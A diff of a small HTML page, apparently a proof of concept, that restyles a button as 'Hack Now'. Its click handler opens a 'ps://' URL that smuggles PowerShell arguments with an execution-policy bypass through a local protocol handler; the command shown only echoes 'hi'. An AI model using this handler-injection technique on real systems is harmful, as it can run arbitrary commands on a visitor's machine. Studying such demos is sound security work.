@@ -1,10 +1,31 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Button to interact with local URL protocol</title>
+    <title>Hacker Button</title>
+    <style>
+      body {
+        background-color: black;
+        color: green;
+        font-family: monospace;
+        text-align: center;
+      }
+      #myButton {
+        background-color: green;
+        color: black;
+        border: none;
+        padding: 15px 32px;
+        text-align: center;
+        text-decoration: none;
+        display: inline-block;
+        font-size: 24px;
+        margin-top: 50vh;
+        transform: translateY(-50%);
+        cursor: pointer;
+      }
+    </style>
   </head>
   <body>
-    <button id="myButton">Click me</button>
+    <button id="myButton">Hack Now</button>
     <script>
       document.getElementById("myButton").addEventListener("click", function() {
         window.location.href = "ps://-noexit -ep bypass echo 'hi'";
